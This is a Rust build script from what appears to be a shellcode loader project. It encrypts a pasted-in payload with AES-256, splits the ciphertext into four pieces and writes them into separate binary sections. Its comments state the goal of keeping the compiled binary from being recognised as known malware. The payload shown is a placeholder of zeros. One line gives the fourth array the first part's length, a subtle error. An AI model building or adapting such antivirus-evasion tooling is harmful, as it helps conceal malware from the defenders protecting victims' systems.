// This build script is used to turn unencrypted shellcode 
// to encrypted shellcode, so the binary wont have known malware

use std::fs;
use std::path::Path;
use libaes::Cipher;
use rand::Rng;

// Paste in your payload
const DATA: [u8; 511] = [0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,
0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0
];

fn split_vec_into_four_parts(data: Vec<u8>) -> (Vec<u8>, Vec<u8>, Vec<u8>, Vec<u8>) {
    let part_size = (data.len() + 3) / 4; // Calculate size of each part, rounding up

    let mut parts = Vec::new();
    let mut start = 0;

    for _ in 0..4 {
        let end = (start + part_size).min(data.len());
        parts.push(data[start..end].to_vec());
        start = end;
    }

    (parts[0].clone(), parts[1].clone(), parts[2].clone(), parts[3].clone())
}
    
// This is not good code, but it works for this purpose and as it's just the build file, it's fine.
fn to_output_string(input: &[u8]) -> String {
    let mut result = String::new();
    result.push_str("[");
    for (i, &byte) in input.iter().enumerate() {
        result.push_str(&byte.to_string());
        if i < input.len() - 1 {
            result.push_str(", ");
        }
    }
    result.push_str("]");
    result
}

fn encrypt_shellcode(code: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8>{
    let cipher = Cipher::new_256(key);
    cipher.cbc_encrypt(iv, code)
}

fn main () { 
    let mut random = rand::thread_rng();

    let key: [u8; 32] = random.gen::<[u8; 32]>();
    let iv: [u8; 16] = random.gen::<[u8; 16]>();
    let dest_path = Path::new("src").join("shellcode.rs");

    let shellcode_data = DATA.to_vec();
    
    // Payload handling:
    let encrypted_payload = encrypt_shellcode(&shellcode_data, &key, &iv);
    let (part_one, part_two, part_three, part_four) = split_vec_into_four_parts(encrypted_payload);

    
    let iv_str = to_output_string(&iv);
    let key_str = to_output_string(&key);
    //let encrypted_payload_str = to_output_string(&encrypted_payload);
    let part_one_string = to_output_string(&part_one);
    let part_two_string = to_output_string(&part_two);
    let part_three_string = to_output_string(&part_three);
    let part_four_string = to_output_string(&part_four);

    // Now, let's split up the payload:

    let file_content = format!(
        "// This file is created automatically during build time.
pub static INITVEC: [u8; 16] = {};
pub static KEY: [u8; 32] = {};
#[link_section = \".data\"]
pub static SHELLCODE_ONE: [u8; {}] = {};
#[link_section = \".srs\"]
pub static SHELLCODE_TWO: [u8; {}] = {};
#[link_section = \".text\"]
pub static SHELLCODE_THREE: [u8; {}] = {};
#[link_section = \".rdata\"]
pub static SHELLCODE_FOUR: [u8; {}] = {};
                ",
        iv_str, 
        key_str, 
        part_one.len(), part_one_string,
        part_two.len(), part_two_string,
        part_three.len(), part_three_string,
        part_one.len(), part_four_string
    );

    fs::write(&dest_path, file_content).unwrap();

}